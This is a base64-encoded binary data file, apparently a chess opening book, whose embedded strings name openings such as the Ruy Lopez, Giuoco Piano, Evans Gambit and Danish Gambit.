kqXCj//wMbYij//z4tbCj//wImcij//zkqviU5M6ImKyQgKDs0eCj//wYVfij//wESAAD/
/xsSlij//wYVnCj//zkqoij//woSqCj//wMMAAD//wQGAAD//zEquij//yEqwCj//zw+xi
j//wImzCj//z400ij//wUh2Cj//zMr3ij//wES5Cj//xsS6ij//woS8Cj//zs0tCg9IvYo
//8GFfwo//8AAwAA//87Awwp//8VJBIp//8zKhgp//8hKh4p//8rJCQp//8EBiop//8+ND
Ap//8CJjYp//86Mzwp//8FIUIp//85Kkgp//8GFU4p//8zK1Qp//8BElop//8bEmAp//8K
EmYp//8EBgAA//8+NHIp//8CCXgp//89In4p//8hGIQp//87KYop//8FIZAp//85KpYp//
8VG5wp//8iGaIp//8JGagp//8yIq4p//8GFbQp//89InwlMyuQKDIirig5KgYpPRlsKTMj
uin//xwkwCn//zw6AAD//x0r4Cn//z0r5in//wId7Cn//ysc8in//wsR+Cn//zkq/in//w
QGBCr//zosCir//wUMECr//zstFir//wYVHCr//xwrIir//yQjKCr//zMjLir//wELNCr/
/y0cOir//xskQCr//yETAAD//zEqTCr//xsqUir//ywzWCr//xUbXir//zosZCr//yQsai
r//z0rcCr//wUhdir//zkqfCr//xskgir//yMsiCr//wESjir//z4tlCr//wMbmir//yQb
oCr//wYVpir//zsjrCr//xwjsir//yIlOSo6JSQb2ik+LUYqMyO4Kv//CxvBKv//UnV5IE
xvcGV6AAILAAD//xgS4ir//wwW6Cr//zEq7ir//xwq9Cr//ywa+ir//xMcACv//yQcBiv/
/x0lDCv//zkqEiv//xUdGCv//zosHiv//wYMJCv//zIiKiv//wkZMCv//ykYNiv//wUTPC
v//z07Qiv//wM7SCv//yMpTiv//xIaVCv//y0jWiv//xwjYCv//zMjZiv//w0VbCv//w0d
AAD//zcveCv//wUTfiv//yM0hCv//wwWiiv//z88kCv//wMEliv//xIaAAD//zg7oiv//w
cEqCv//zw1riv//wUTtCv//zcvuiv//wwWwCv//yM0xiv//w0VzCv//zw6nCs1JdIr//8G
DNgr//85M+Ir//8EAugr//86LO4r//8CC/Qr//8tI/or//8DIwAs//87IwYs//8cIwws//
8EAgAA//8jKRgs//8CCx4s//88OiQs//8GDCos//86LDAs//8FEzYs//8tIzws//8DI0Is
//8MEgAA//87Kk4s//8EAlQs//86JVos//8GDGAs//88PmYs//8CFGws//8qO3Is//8DO3
gs//8jNH4s//8SGoQs//87I0gsLSOKLP//HCOQLP//HCYAAP//JB2gLP//FhymLP//JRys
LP//FR2yLP//NSW4LP//Awy+LP//Pj/ELP//CRHKLP//OizQLP//BAbWLP//MyncLP//DB
biLP//PD7oLP//AhTuLP//DBIAAP//OzL6LP//BAYALf//PD4GLf//AwsMLf//MioSLf//
AhQYLf//NC4eLf//EhokLf//LTP0LDosKi3//wYMMC3//yo0Oi3//wUTQC3//zMjmiwzK0
Yt//8NFUwt//88PnIrMyMSLDkqVi3//wsSXC3//wQGAAD//zoecC3//wIJdi3//zMjfC3/
/wMMgi3//xsMiC3//xIYji3//xQjAAD//yUdmi3//xoUoC3//zUlpi3//wsarC3//y08si
3//xULuC3//zIivi3//w4WxC3//zApyi3//xgp0C3//zQu1i3//wIJ3C3//yo04i3//xIY
6C3//wIJAAD//z089C3//xUk+i3//zIpAC7//xgpBi7//zMjDC7//wMMEi7//xwjAAD//z
MjHi7//wQGJC7//zAbKi7//wABMC7//zIqNi7//xIaPC7//xswQi7//woSSC7//zAbTi7/
/xUbVC7//zUtAAD//wIJYC7//y0zZi7//xwkbC7//yQbci7//xUbeC7//zIpfi7//xgphC
7//xsMGC4pMFouMyOKLv//EhiQLv//KhueLv//GSGkLv//KhuULTMr7i0wIKou//8LE7Au
//88Pr4u//8FDMQu//8gKcou//8JGdAu//8CHQAA//88Ptwu//8EBuIu//8jHOgu//8SHO
4u//8tHPQu//8VJPou//8yKgAv//8LGwYv//8zIwwv//8QGRIv//8gGRgv//8AAR4v//8w
ICQv//8FDCov//8gKTAv//8JGTYv//8SGgAA//87NEIv//8CFEgv//85Kk4v//8DClQv//
8qIlov//8JEmAv//8bEmYv//8KEmwv//89PHIv//8SDHgv//8jG34v//8EBoQv//8rI4ov
//8FDpAv//8bIwAA//86Hpwv//8CCaIv//88Pqgv//8FBK4v//87NLQv//8TG7ov//8FBA
AA//87NMYv//8TG8wv//83L9Iv//8YEtgv//88Pt4v//8KGuQv//8pMuov//8SGPAv//8g
MsAvICn2L///CRn8L///PS4GMP//BAYMMP//Mz0SMP//BQ4YMP//PD6WLysjAAA5Mx4w//
8OFiQw//8TGwAA//81LTgw//8KEz4w//8aE0Qw//8DDEow//85KlAw//8EBlYw//8iGlww
//8FDmIw//88Pmgw//8JEm4w//8jEnQw//8CC3ow//8tI4Aw//8cI4Yw//8LGgAA//87NJ
Iw//8JEpgw//8gEp4w//8VC6Qw//83L6ow//8EBrAw//8eM7Yw//8PF7ww//86HsIw//8F
Dsgw//8rI4wwOSrOMP//DhbUMP//BgwAAP//PDrkMP//FQbqMP//NibwMP//Dxf2MP//Oz
P8MP//EhoCMf//MSkIMf//AAEOMf//OiwUMf//BQ4aMf//OSogMf//DhYmMf//Ny8sMf//
CRIyMf//MioyMDIi3jAgEjgxOSoAAP//CxM+Mf//EhoAAP//OixWMf//FRRcMf//Ni5iMf
//AxVoMf//KyJuMf//FCJ0Mf//MyJ6Mf//FR+AMf//OzSGMf//AhSMMf//OTOSMf//BROY
Mf//AxsAAP//OzSkMf//FiSqMf//KiSwMf//FSS2Mf//LRy8Mf//HxbCMf//NibIMf//Jh
/OMf//Ny/UMf//AibaMf//MyueMTkq4DH//wsS5jH//wImAAD//yAp9jH//wMY/DH//yo0
AjL//woSCDL//zg7DjL//wsbFDL//xosGjL//x4MIDL//yMaJjL//wweLDL//zoeMjL//w
QGODL//zkqPjL//yQaRDL//zsjSjL//xIjUDL//wMVAAD//xwVXDL//w0VYjL//zUlaDL/
/wwFbjL//zosdDL//wUEejL//zkqgDL//wQGhjL//y0jjDL//wsSkjL//yASmDL//yQanj
L//y0jVjI9PKQy//8VJKoy//8aIgAA//8jKroy//8KGsAy//8gKcYy//8JGcwy//87I9Iy
//8SI9gy//8KGgAA//87I+Qy//8SI+oy//8tI/Ay//8LE/Yy//8gKfwy//8JGQIz//8kHL
QyLSPeMj08CDP//xwjDjP//w4WAAD//zsmIjP//wIUKDP//ycdLjP//wsaNDP//zQtAAD/
/wIQQDP//z08RjP//wkRTDP//yw7UjP//xwNWDP//zUlXjP//xAYZDP//zozajP//wYHcD
P//zs0djP//wUEfDP//zIqgjP//wwaiDP//yIsjjP//wsclDP//y0jmjP//xwjoDP//y0n
OjMrI6Yz//8NFawz//8zIrYz//8EBrwz//8jNAAA//8SGsgz//8qJM4z//8VDNQz//8kHN
oz//8LEeAz//81JeYz//8MFewz//85KvIz//8EBvgz//8tI/4z//8cIwQ0//85M8IzKyMK
NP//FQsQNP//MysaNP//CxIgNP//BAYAAP//MCksNP//GCkyNP//Oh44NP//Agk+NP//My
NENP//AwxKNP//GwxQNP//EhhWNP//KhtcNP//CxNiNP//ICloNP//CRluNP//AxsAAP//
MBt6NP//CRuANP//OiWGNP//GiOMNP//LSOSNP//ChqYNP//HC2eNP//GiOkNP//MyOqNP
//DBqwNP//Ozy2NP//Njy8NP//IxvCNP//JTbINP//KiPONP//GyXUNP//MiraNP//FRvg
NP//KTDmNP//AgnsNP//LRzyNP//EiP4NP//AAgAAP//GwkENf//EhwKNf//LRwQNf//Ag
kWNf//JBv+NCkbHDX//wsbIjX//zkzAAD//xsjMjX//zIpODX//wYOPjX//zw7RDX//w0d
SjX//ystUDX//x4kVjX//y0lXDX//w4WYjX//zsraDX//yQebjX//zYtdDX//yYtejX//z
cvgDX//xQmhjX//w0VAAD//zolkjX//wUAmDX//z01njX//yc1pDX//zI1qjX//yMrsDX/
/zw9tjX//wMnvDX//xsAwjX//xojyDX//ykbzjX//woa1DX//zsy2jX//xQm4DX//y0k5j
X//wwT7DX//zUt8jX//xIc+DX//ykyjDUtI/41//8CFAQ2//8jHA42//8VJBQ2//8uLwAA
//88LCA2//8ABCY2//8+Pyw2//8vLjI2//82Pjg2//8nLz42//83NkQ2//8DJ0o2//8+N1
A2//8TN1Y2//8pG1w2//8ME2I2//8eD2g2//8VG242//82LXQ2//8kLXo2//8mLwAA//88
HIY2//8DJ4w2//82LZI2//8cLZg2//8kMp42//8NHaQ2//8zI6o2//8ME7A2//8yJLY2//
8VJLw2//8eJMI2//8SHMg2//81LYA2OzLONv//AibUNv//AwQAAP//MzzkNv//BDzqNv//
LSvwNv//Aib2Nv//OjP8Nv//BQQCN///Oy0IN///DBMON///EzcAAP//MyMaN///Jh0gN/
//NS0mN///BQQsN///BBwAAP//LiY4N///FR8+N///JRxEN///ExxKN///PBxQN///BQRW
N///LicyNzUlXDf//wwTYjf//y0ubDf//wImcjf//zMjFDc7LXg3//8kLX43//8tHt42Gx
KIN///HCSON///MyMaNiQbmDf//wsbnjf//xAYAAD//zAorjf//wMLtDf//yUuujf//wQK
wDf//zkzxjf//woazDf//zIq0jf//xMb2Df//yMs3jf//wId5Df//zol6jf//wsT8Df//z
sj9jf//xUE/Df//yQcAjj//xwjCDj//y0jDjj//xIjFDj//xsVAAD//zkzIDj//xwjJjj/
/ysjLDj//wMTMjj//zMrODj//xUbPjj//yQbRDj//wsbSjj//zIqUDj//wIJVjj//zAgLD
UyKqg3MyMaODcvXDj//wQGYjj//yApdDj//wkZejj//xMbAAD//ykihjj//wABjDj//zIq
kjj//wsTmDj//yAYnjj//xkhpDj//xAYAAD//zMjsDj//wIJtjj//zQcvDj//xIcwjj//y
0cyDj//xUbzjj//xwWAAD//zYt2jj//yYt4Dj//ysj5jj//xUf7Dj//z078jj//xIc+Dj/
/yMc/jj//wImBDn//yojCjn//xsjEDn//yQb1DgzKxY5//8LGxw5//8wIKo4MiomOf//BA
YsOf//ICk2Of//CRk8Of//MyMcMyASJjQ5KnQ0PTyAODs0Qjn//wUMSDn//zkq1i47NDwv
MytQMSAS8DE8Pl45//8GFWQ5//8ZEmotGSB6Of//2CoIEIA5//9TY290Y2ggR2FtZQA9PA
AA//8SGp45//88NKQ5//8CFKo5//83L7A5//8FBLY5//8qO7w5//8AAcI5//8XHgAA//8B
Ic45//8sF9Q5//8ME9o5//8tLOA5//8OF+Y5//8eF+w5//8PF/I5//84Ofg5//8AAf45//
84PMg5PTwEOv//IQwKOv//GyQAAP//OyAaOv//FycgOv//LSQmOv//ExcsOv//NS0yOv//
IRo4Ov//Mio+Ov//FSREOv//HidKOv//AxNQOv//NCNWOv//BQRcOv//Oy0UOio0Yjr//w
oSaDr//zoecjr//wQGeDr//wUEAAD//zsrhDr//wQGijr//zw+kDr//wMLljr//woSAAD/
/zw6ojr//wsRqDr//zozrjr//wQMtDr//zQMujr//xULwDr//xkLxjr//wMMzDr//xkLnD
o7NNI6//8CC9g6//88Pn46KxniOv//EhvoOv//DRUAAP//OiX4Ov//BAb+Ov//PD4EO///
FSYKO///kjkkG/I6JBwQO///CxsZO///AAEAAP//Oy0oO///IRouO///LSQ0O///FSQ6O/
//KiRAO///GyRGO///NS1MO///CxtSO///PStYO///BAZeO///OzMAAP//ITNqO///LSRw
O///FSR2O///KiR8O///GySCO///PDqIO///CxuOO///BQQAAP//ChoAAP//NSygO///Gi
ymO///HiysO///IRqyO///OiyaOzoeuDv//wIQvjv//ys0yDv//xoizjv//zw+1Dv//wsb
2jv//zozlDs9K+A7//8EBuY7//8jNfA7//8SGvY7//81Lfw7//8DDAI8//89KyI7OjNkOz
sjCDz//wkSDjz//xIjAAD//zEoIjz//yEoKDz//xkoLjz//wgQNDz//zYtOjz//xUtQDz/
/xgRAAD//zEhTDz//yEYUjz//zstRjwwKFg8//8EA148//8jGWg8//8DFW48//8eFXQ8//
8PF3o8//8jEhw8Oh6APP//BSGGPP//ChMAAP//HBuWPP//CxucPP//NCSiPP//BAaoPP//
OjGuPP//BQy0PP//MSm6PP//DBTAPP//OTPGPP//GxHMPP//CBgAAP//DhYAAP//CRAAAP
//MCDkPP//DRXqPP//NSXwPP//AwT2PP//OjP8PP//GxECPf//ISQAAP//NDMOPf//DCEU
Pf//MiIIPSkYGj3//wQCID3//zMpKj3//wIJMD3//zIi0jwxKdg8Ni7ePDkzNj3//xUbPD
3//zs0Tj3//wMMVD3//wQGAAD//xwVYD3//5I5DRVmPf//GhMAAP//Pzd0Pf//NS16Pf//
Ni+APf//Ai+GPf//Pj+MPf//FTWSPf//NByYPf//BAaePf//OzSkPf//AxWqPf//PTywPf
//Jhy2Pf//Dx8AAP//Ny/CPf//AyfIPf//Dx8AAP//Ny/UPf//AyfaPf//OiVvPTcvvD0y
Ks49OzTgPf//BRrmPf//PD5vPf//BRr+Pf//PD74PTolBD7//xUmCj7//xMuAAD//y0uGj
7//wMTID7//yQbJj7//xUmLD7//zstMj7//wQGOD7//zw+Pj7//wUaRD7//woaAAD//yo0
UD7//wwTVj7//zszXD7//wMLYj7//z08aD7//wIUbj7//wIUAAD//zoldD46Hno+//8EBo
A+//85Koo+//8FDJA+//8VJAAA//8zLZw+//8FBKI+//8xKag+//8EBq4+//85M7Q+//8F
DLo+//88PsA+//8DC8Y+//8ZC8w+//8CC9I+//88PpY+KxnYPv//EhvePv//BSEZO///Aw
wAAP//NCT0Pv//FST6Pv//KyQAP///GyQGP///JBwUPjkzSj4kG+g+OSruPjs0DD///wsb
Ej///xoRAAD//zMpLj///xIbND///zcuOj///xMuQD///y0uRj///wMTTD///yQbUj///x
UmWD///zstXj///wsbZD///zw+aj///wQGcD///wwVAAD//xwVfD///w0Vgj///zw6iD//
/wQGjj///zAglD///wgYmj///zozoD///xoRpj///zMprD///xUbsj///zs0uD///wMMvj
///z0rdj8kHMQ///8FGso///8kHFo9PSsoPzkz1D///wkS2j///wsTAAD//zkq7j///wwh
9D///xUbAAD//yMd+j8jGQBA//8DDAZA//87NBBA//8SHBZA//8FDAAA//8FDAAA//88Pi
hA//8VJC5A//85KpA8IxLoPyQcHEA6HiJAPSI0QP//BhU6QP//AgkAAP//IilWQP//CRlc
QP//KhtiQP//CBBoQP//Jy5uQP//DBZ0QP//PDp6QP//BgyAQP//HieGQP//DxeMQP//Oz
OSQP//AwuYQP//Oh6eQDspAAD//wsTpED//wMMAAD//xsatED//w0FukD//zsbwED//wQN
xkD//zkqrkAiDcxA//8jKtJA//8jKwAA//88NOJA//8aIehA//86F+5A//8dHPRA//82Jv
pA//8HBgBB//8VDgZB//8NFAxB//8eFBJB//8EAhhB//8qJB5B//8bHSRB//85KipB//8D
GzBB//8tHjZB//8CFDxB//89PEJB//8bIkhB//8cFU5B//8LG1RB//8kHFpB//8GFWBB//
8PHwAA//8uJ2xB//8HBHJB//8zLXhB//8CHX5B//8oLoRB//8kG4pB//85M5BB//8MJJZB
//88PpxB//8DDKJB//8aKKhB//8LE65B//8fGrRB//8OFrpB//87H8BB//8EDcZB//8iDc
xB//8XDdJB//8VHgAA//8fD95B//8XJuRB//86HupB//8HD/BB//8eD/ZB//8SHPxB//8l
HQJC//8LEwhC//81JQ5C//8DFRRC//8eDdhBOx8aQv//BhcgQv//MircQDw+ZkEtHipC//
8FGjBC//8EAgAA//85M0RC//8mC0pC//8fJ1BC//8CJlZC//86JVxC//8DDGJC//89PGhC
//8WHG5C//8kHHRC//8MFnpC//87H4BC//8LE4ZC//8tHoxC//8hGpJC//8xKphC//8GDJ
5C//88PqRC//8jKqpC//8yKrBC//8FIbZC//9Hb3JpbiBHYW1iaXQAAAUOAAD//zMt0EL/
/w4W1kL//zsy3EL//wwF4kL//zUl6EL//wUE7kL//zkz9EL//wQG+kL//y0jAEP//wUMBk
P//zw+DEP//wYVEkP//zcvGEP//wsTHkP//z0rJEP//8JCIysqQ///LSNQQD0iPkI9GbxC
MiozQ///kjkcIzhD//9HaXVvY28gUGlhbm8AAA8fAAD//wYNYEP//x8PZkP//yUmbEP//z
YmckP//x0leEP//w8XAAD//wUMhEP//zwMikP//w0VkEP//wcPlkP//w4XnEP//w8HokP/
/wYHqEP//yIZrkP//wMFtEP//zg8ukP//wUGwEP//ycXxkP//wYNzEP//wMVAAD//w8W2E
P//w0U3kP//yIU5EP//xUU6kP//xsU8EP//wIU9kP//zwU/EP//wYNAkT//x8PCET//wUV
DkT//ycvFET//wwWGkT//xcPAAD//wUNJkT//x8XLET//w4VMkT//xQVOET//xIZPkT//z
wURET//woSSkT//zQZUET//wYFVkT//zg8XET//wUEYkT//wwVAAD//ycvbkT//w0GdET/
/w8WekT//zwMgET//z42hkT//wQ8jET//zQfkkT//wwWmET//yI0nkT//wILpET//zg8qk
T//wYNsET//x8PtkT//wMEvET//ycvfkMfD9JDODwgRCI0aEQ2LsJE//8NHchE//8kJ95E
//8PBuRE//87H+pE//8GD/BE//8NFAAA//8eFPxE//8PFwJF//80HwhF//8MHQ5F//8eD/
ZEOzQURf//BAYaRf//LR4kRf//FR4qRf//BQQAAP//KyQ2Rf//Agk8Rf//IitCRf//CRlI
Rf//OixORf//AwtURf//HDxaRf//DBZgRf//JBxmRf//ExxsRf//LRxyRf//FRx4Rf//Jh
5+Rf//BAaERf//Oh4wRTYmikX//wsTkEX//zwkmkX//xIMoEX//z08pkX//yoVrEX//wQG
AAD//zg8uEX//xsSvkX//xwSxEX//wcEykX//y0c0EX//wQC1kX//zs03EX//wMb4kX//z
wk6EX//wIU7kX//z089EX//xsi+kX//wMbAAD//y0eBkb//xskDEb//yskEkb//wQGGEb/
/zooAEYiKx5G//8LGyRG//8jG7JFMSouRv//ISo0Rv//PD4+Rv//FSRERv//JB4AAP//AA
NQRv//MyRWRv//AhRcRv//KShiRv//AxFoRv//AhQAAP//Iil0Rv//ESl6Rv//JCqARv//
AxGGRv//FAIAAP//JBqSRv//AAOYRv//MySeRv//EQqkRv//IBiqRv//AhSwRv//KSi2Rv
//AxG8Rv//ODpuRjMkjEYwIMJG//8KEshG//89PNZG//8EBtxG//88PuJG//8SDOhG//87
Ke5G//8VG/RG//8kG/pG//8LGwBH//85MwZH//8hMwxH//8EBgAA//87NBhH//8CFB5H//
85KiRH//8VGypH//8kGzBH//8LGzZH//85KkpGOjMSRzw9PEf//xohQkf//zg6AAD//yEY
Vkf//zAoXEf//xIMYkf//zw+aEf//wQGbkf//zkzdEf//yQzekf//wMLAAD//zoshkf//w
IUjEf//zkqkkf//yEMmEf//zspnkf//wQGpEf//zozgEc8PapH//8aIbBH//8qI7pH//8V
JMBH//8SIwAA//8qI8xH//8HBtJH//8VDthH//8CFN5H//87NORH//8bIupH//8NHQAA//
85KvZH//8EBvxH//88PgJI//8aEQhI//8qIw5I//8VJBRI//8iGcZHHBXwRyI0Gkj//wsb
IEj//yojUEckHC5I//8cIzRI//8OFgAA//8fF0RI//8EBkpI//88OlBI//8VJlZI//87NF
xI//8cJWJI//8sJWhI//8WJW5I//8nH3RI//8DDHpI//83J4BI//8MFoZI//8DDAAA//8r
I5JI//8EBphI//88Op5I//8MFqRI//87MqpI//8KErBI//8rI4xIMz22SP//Egy8SP//OT
PGSP//GhHMSP//ChIAAP//PDrYSP//DBzeSP//LRzkSP//EhzqSP//OzLwSP//Awz2SP//
KyT8SP//HCQCSf//GiwAAP//LR4OSf//AhQUSf//OzQaSf//AxMgSf//NSwIST0sJkn//x
ssLEn//zosNkn//xUbPEn//yQbQkn//xMbSEn//zM9Tkn//wQGVEn//zos0kg5M1pJ//9S
QwsTYEn//zMjPkgzK21J//8GFXJJ//8tIwAA//8cI4JJ//8rI4hJ//8IEY5J//8bEZRJ//
8aEZpJ//8IEQAA//8bEaZJ//8aEaxJ//8qI7JJ//8cI7hJ//8xIaBJKyO+Sf//EgzESf//
MirOSf//FQPUSf//KhvaSf//AxXgSf//HhXmSf//DxfsSf//AAMAAP//Iin4Sf//AhT+Sf
//PD4ESv//AwwKSv//Ny8QSv//BAYWSv//Dx8AAP//LTQAAP//Oh4oSv//Hx4uSv//Mx40
Sv//Ji06Sv//OzNASv//BB9GSv//Ni1MSv//Iy1SSv//MipYSv//AwReSv//DSlkSv//BA
xqSv//Ig1wSv//Exp2Sv//IBp8Sv//EiOCSv//EgwAAP//Pj+OSv//GhGUSv//Ny8iSiog
iEo6LJpK//8CJqBK//8FBAAA//88PrRK//8IEbpK//8sEcBK//8VG8ZK//8pG8xK//8UG9
JK//8kG9hK//8TG95K//8qNORK//8EBupK//87M/BK//8aEfZK//86LPxK//8DCwJL//8i
KQhL//8CFA5L//86HvJJOiwcSjw+rko3LxRL//8LExpL//85KixLMiptSf//BhUyS///LS
YAAP//ABtCS///DS1IS///PjYAADMtTkv//xwtVEv//zkzXkv//xIcZEv//zYtakv//yYt
cEv//wkAdkv//wQLfEv//ykJgkv//wsNiEv//yINjkv//wMLlEv//zspmkv//xwjoEv//z
Mjpkv//wImrEv//zIqskv//wsTuEv//0V2YW5zIEdhbWJpdAAAKzMAAP//Mz3SS///NDzY
S///PT7eS///JDTkS///OTPqS///IyvwS///PD32S///DCT8S///GRgCTP//BAMITP//PD
0AAP//DCQUTP//IBgaTP//BAUgTP//KRkOTCkgJkz//xwjLEz//wIQAAD//yojPEz//wQL
Qkz//xkLSEz//xwjTkz//yIZVEz//xEYWkz//y0jYEz//wkRZkz//yAYbEz//wwLckz//y
0jNkwpIHhM//8SI35M//8jG4hM//8DDI5M//8GFwAA//85M5pM//8EAqBM//89O6ZM//8T
HKxM//8jHLJM//8DDLhM//87Kb5M//8CC8RM//87KZRMPD7KTP//CxPQTP//xEszI9pM//
8hGONM//8yKuhM///ESxoh7kz//xojAAD//1JDMip8STMrPEs8Pr5LMSH3TDMj/Ez//1R3
byBLbmlnaHQncyBkZWZlbmNlAAAUDQAA//86JTBN//8QCjZN//8zIzxN//8hEEJN//8wKE
hN//8KEk5N//8tJFRN//8bKQAA//8NBWBN//8iG2ZN//8SG2xN//8qG3JN//8UDXhN//8k
HH5N//8FJYRN//86OYpN//8MHpBN//8tJJZN//8HBZxN//88OqJN//8FDKhN//8eDK5N//
8PF7RN//86HrpN//8cFAAA//8LCsZN//8jHMxN//8UC9JN//89PNhN//8KEt5N//88PuRN
//8KEsBNDxfqTf//MyPwTf//EiFaTRIM+k3//zkqAE7//w0UCk7//zstEE7//wQNFk7//w
MnAAD//zwUIk7//yI9KE7//xQ8Lk7//x4DNE7//wsUOk7//zoeQE7//wADRk7//zwUTE7/
/w0GUk7//zstWE7//wQNXk7//x4NZE7//wMLak7//z08cE7//wIUdk7//zw+fE7//xQLAA
D//yUciE7//woSjk7//zUllE7//xIMmk7//zw+oE7//wwFpk7//y0krE7//w0Usk7//zst
uE7//wQNvk7//x4NxE7//yEMyk7//zIq0E7//xwjgk4FIdZO//8eDRxOMyPcTv//DBoAAP
//LTPwTv//DR32Tv//PTz8Tv//EyQCT///PD4IT///AwwOT///KiQUT///FSQaT///AwsA
AP//IyAmT///Ex0sT///OSogTyQcMk///yITOE///zsjQk///xgiSE///xohAAD//zMpVE
///wUEWk///zkqYE///woSZk///zQ9bE///wImck///y0zeE///wQGfk///zolhE///wUa
ik///ysikE///xgilk///yskTk87NJxP//8cJKJP//8eLaxP//8PF7JP//8VGwAA//8zK7
5P//8LEsRP//8ZEspP//8YEtBP//8bEtZP//8KEtxP//88PuJP//8EBuhP//85Ku5P//8F
DPRP//87NPpP//8cJAAA//81JQZQ//8JGgxQ//8+PxJQ//8aERhQ//85Kh5Q//8YCSRQ//
8zKypQ//8EBjBQ//88PjZQ//8FGjxQ//8THAAA//80LUhQ//8IGE5Q//88PlRQ//8EBlpQ
//87K2BQ//8kI2ZQ//8zI2xQ//8aE3JQ//8xIXhQ//8YCX5Q//8yKoRQ//8FGopQ//81JZ
BQ//8YEgAA//89PJxQ//8FBKJQ//8sPqhQ//8AA65Q//86LLRQ//8CCbpQ//8+P8BQ//8I
EMZQ//85KsxQ//8SGtJQ//88PthQ//85KgAA//8jKuRQ//8yKupQ//8TGvBQ//8+P/ZQ//
8aI/xQ//88PgJR//8DCt5QEhoIUf//MyMOUf//BAYYUf//HC0eUf//JCUkUf//IysAAP//
MCAwUf//ChE2Uf//NBk8Uf//ARlCUf//KBlIUf//GiNOUf//OShUUf//AAFaUf//MipgUf
//EhpmUf//Pj8AAP//ExpyUf//Ixp4Uf//Ehp+Uf//OzyEUf//CQOKUf//PD6QUf//MCgA
AP//CBicUf//OTOiUf//GAmoUf//MSGuUf//OzwAAP//AAG6Uf//PD7AUf//BQPGUf//KD
LMUf//AxMAAP//GRPYUf//ChHeUf//KBnkUf//BQPqUQgQ0lH//zko8FH//xIa+lEYCZZR
AAG0Uf//MioAUjw+bFH//wQGDlL//zUlGFL//wMKHlL//zUlKlEzIyRS//8DCpZQBRMqUv
//LRw0Uv//HCQ+Uv//Hi9CUB4tRFL//w8XSlL//xk0VFL//wkSWlL//xsSYFL//wILAFAK
EmZS//8iGWxSMyu4T///Ehh2UhUb5k7//yQbgFL//wsbilL//xpNLR6QUv//UkMFGgVNBh
WZUv//UG9uemlhbmkAAAUMAAD//yMstFL//wsbulL//zsjwFL//wMLxlL//xkLzFL//xIj
0lL//yQb2FL//wIL3lL//y0j5FL//xwj6lL//xs2AAD//zUs9lL//yQs/FL//y0zAlP//x
wkCFP//z00DlP//wMbFFP//z0Z8FIkGxpT//8LGyBT//8FGgAA//85MzBT//8LGzZT//8z
IypTMys8U///qlIGFUJT//8DEwAA//86HlRT//8PH1pT//83J2BT//8CCWZT//89LmxT//
8JEXJT//8zPXhT//8EBn5T//87MoRT//8FDopT//8yKpBT//8OFpZT//85M5xT//8LG6JT
//8zK6hT//8GFa5T//85MwAA//8LG7pT//82LsBT//8GFcZT//8GFe0h//89GY05MyNNQz
0ioVIyKk9TPTS0UzMrzFM5KtJT//8BEthT//9CaXNob3BzIEdhbWUAABUdAAD//xspClT/
/woSEFT//z4tFlT//w4VHFT//y0VIlT//wMVKFT//zkqLlT//yoyNFT//x4VOlT//yMqQF
T//zoeRlT//xwjTFT//ycuAAD//zw7WFT//xo1XlT//zI0ZFT//wwnalT//z0/cFT//yY3
dlT//zYtfFT//wUtglT//wwnAAD//zYtjlT//wUtlFT//z89iFQ8PppU//8VJqBU//8zK6
pU//8BErBU//8+LbZU//8NFLxU//8iFMJU//8mFMhU//8rMs5U//8DDNRU//8tK9pU//8C
JuBU//8zI1JUGyLmVP//BAbsVP//Oy32VP//BhX8VP//IhsCVf//CxsIVf//ARIFTf//Ay
cAAP//Pz4aVf//Gj4gVf//NSUmVf//ARIsVf//MysyVf//CxM4Vf//JCwAAP//OzxEVf//
AiZKVf//Pj9QVf//ARJWVf//GxJcVf//ChJiVf//OSpoVf//BAZuVf//PD50Vf//BhV6Vf
//PjSAVf//HCSGVf//JBuMVf//CxuSVf//ARLjTP//Pi2eVf//IRikVf//NSWYVTIqqlX/
/xohsFX//wQGAAD//zs0wFX//wYVxlX//xojAAD//zIqDlU7JgAAPi0UVTkqPlUxIbpVMy
vMVTMj0lX///xTBRrYVf//Q2VudGVyIEdhbWUAEiEAAP//JBsKVv//FRsQVv//KhsWVv//
CxscVv//OSoiVv//BhUoVv//JjYAAP//NSw0Vv//Kiw6Vv//KzJAVv//FSpGVv//LixMVv
//IyZSVv//MSpYVv//ISpeVv//MipkVv//JiNqVv//LCNwVv//JCZ2Vv//JSx8Vv//EiOC
Vv//PSuIVv//CxOOVv//Pi+UVv//AxWaVv//MyWgVv//BCSmVv//KiSsVv//FSSyVv//FR
sAAP//Khu+Vv//BgXEVv//LC3KVv//AwLQVv//NyfWVv//DxfcVv//NSXiVv//FAToVv//
LR7uVv//BBT0Vv//IhT6Vv//AhQAV///FQsAAP//Jh4MV///ChISV///NiYYV///AhQeV/
//IikkV///EhwqV///Pi0GVzUtMFf//wsTNlf//ywuuFY9IkBX//8FBEZX//88OlBX//8E
BlZX//86M1xX//8FIWJX//8DJwAA//86F25X//8CFHRX//8cE3pX//8mF4BX//81LYZX//
8LE4xX//8mNQAA//88O5hX//8DO55X//8TIQAA//8QCapX//8DE7BX//8TCqRXPRC2V///
AhS8V///HBvGV///CxvMV///LDSSVywk0lf//xUm2Ff//xIjAAD//z886Ff//wsd7lf//y
sd9Ff//wwV+lf//z0rAFj//yYdBlj//xIjAAD//zs6Elj//yYlGFj//ys0Hlj//wQ0JFj/
/z00Klj//wsmMFj//ywrNlj//wcEPFj//zw7Qlj//wwnSFj//zw6DFgtJk5Y//8EAlRY//
81LV5Y//8bC2RY//80JWpY//8CJnBY//8MEwAA//89K3xY//8OFoJY//8sLohY//8EBo5Y
//8UHQAA//8tHppYPTQAAP//BAKgWP//Pi2qWP//GgywWP//Myy2WP//HRS8WP//OzzCWP
//DBrIWP//LBrOWP//Ah3UWP//PDraWP//GxrgWP//PjR2WDMqlFgyIuZY//8DG+xY//8q
G/pY//8VGwBZ//8kGwZZ//8LGwxZ//85KhJZ//8FDBhZ//8cKwAA//8VJAAA//8uNSRZPD
UqWf//GjUwWf//HCsAAP//LC46WSwaQFn//yEaRln//zIqUFn//wUhVln//yIpXFn//xIc
Yln//zkqaFckHOJXOjMeWT0iaFn//wYVbln//yMiLlYjIAAAIyyAWf//ARKGWf//RGFuaX
NoIEdhbWJpdAALGgAA//88PqhZ//8BC65Z//8+LbRZ//8LE7pZ//85KsBZ//8KEsZZ//86
McxZ//8qMdJZ//8DAgAA//87Kd5Z//8NFORZ//8bFOpZ//8FDPBZ//88PvZZ//8GFfxZ//
8MFgAA//84PQha//8EBg5a//89NRRa//8DDRpa//86LCBa//8GDCZa//8lHixa//8MHjJa
//88Pjha//8FDD5a//81JURa//8SA0pa//8tHlBa//8DAlZa//87KVxa//8NFGJa//8iGw
